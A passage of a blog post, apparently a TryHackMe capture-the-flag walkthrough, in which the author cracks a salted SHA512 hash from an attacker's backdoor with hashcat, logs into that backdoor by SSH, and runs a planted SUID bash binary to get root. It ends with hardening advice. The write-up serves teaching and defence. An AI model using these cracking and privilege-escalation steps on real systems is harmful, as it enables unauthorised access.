+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">verifyPass</span>(<span style="color:#a6e22e">hash</span>, <span style="color:#e6db74">&#34;1c362db832f3f864c8c2fe05f2002a05&#34;</span>, <span style="color:#a6e22e">password</span>)
+</span></span></code></pre></div><p>do you remember the hash the attacker used to login to the backdoor? that hash had this salt hardcoded onto it. identifying the attacker&rsquo;s hash as <code>SHA512($pass.$salt)</code>, we can now try crack it. this time, i used hashcat:</p>
+<pre tabindex="0"><code>hashcat.exe -a 0 -m 1710 &#34;6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05&#34; C:\rockyou.txt --force
+</code></pre><p>the password we get after the hash is cracked is &ldquo;november16&rdquo;.</p>
+<p>let&rsquo;s now login to the attacker&rsquo;s backdoor. our target IP is 10.10.12.175, and the backdoor was running on port 2222:</p>
+<pre tabindex="0"><code>ssh -p 2222 james@10.10.12.175
+</code></pre><p><img src="/overpass-backdoor.png" alt="backdoor"></p>
+<p>we are logged in as james, into the backdoor, and we can access the user.txt flag.</p>
+<p>while we&rsquo;re here, let&rsquo;s run <code>ls -la</code> and see what we get.</p>
+<p><img src="/overpass-backdoor2.png" alt="backdoor"></p>
+<p>we can see a root process called <code>.suid_bash</code>. a quick google search shows that this little exploit opens a bash shell as root, meaning although an attacker may not be root, running the process will give them the effective privileges of root.</p>
+<p><img src="/overpass-suidbash.png" alt="bash"></p>
+<p>so let&rsquo;s run this process by typing <code>./.suid_bash -p</code> and get the root flag.</p>
+<p><img src="/overpass-suidbash2.png" alt="backdoor"></p>
+<p>uploading a php reverse shell via an upload form is a very simple and preventable attack vector. it can give an attacker direct access to the target. in this case, a backdoor was also set up, which should be prevented at all costs. a quick fix would have been to set up multiple firewalls (using iptables, ufw, or whichever linux firewall they choose) and having an implicit deny for all traffic other than what is specifically allowed.</p>
+<p>a proxy with deep packet inspection capabilities, and which intercepts SSL/TLS connections and blocks any suspicious outbound traffic would also have helped. a simpler solution is to disable the ability for executables to run from temp directories.</p>
+<p>finally, if your company wants to spend the time in understanding and implementing software restriction policies, which only allow known executables to run, that is the best solution.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="tags/cybersec/">cybersec</a></span>
+        <span class="tag"><a href="tags/tryhackme/">tryhackme</a></span>
+        <span class="tag"><a href="tags/walkthrough/">walkthrough</a></span>
+        <span class="tag"><a href="tags/pentesting/">pentesting</a></span>
+        <span class="tag"><a href="tags/wireshark/">wireshark</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        1289 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-10-27 08:16
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="/posts/2021/11/tryhackme-ra/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">tryhackme: ra</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="/posts/2021/10/tryhackme-game-zone/">
+                    <span class="button__text">tryhackme: game zone</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.0931a358499291afca6f741478e9fc9fa973a9fbd7aeb3390f3b10463966dc8195daf98a0e33685a1fbfb9d7578631c3f31fc8e558eaf6e2c30c4c3e14df4931.js" integrity="sha512-CTGjWEmSka/Kb3QUeOn8n6lzqfvXrrM5DzsQRjlm3IGV2vmKDjNoWh&#43;/uddXhjHD8x/I5Vjq9uLDDEw&#43;FN9JMQ=="></script>
+
+
+
+    </body>
+</html>
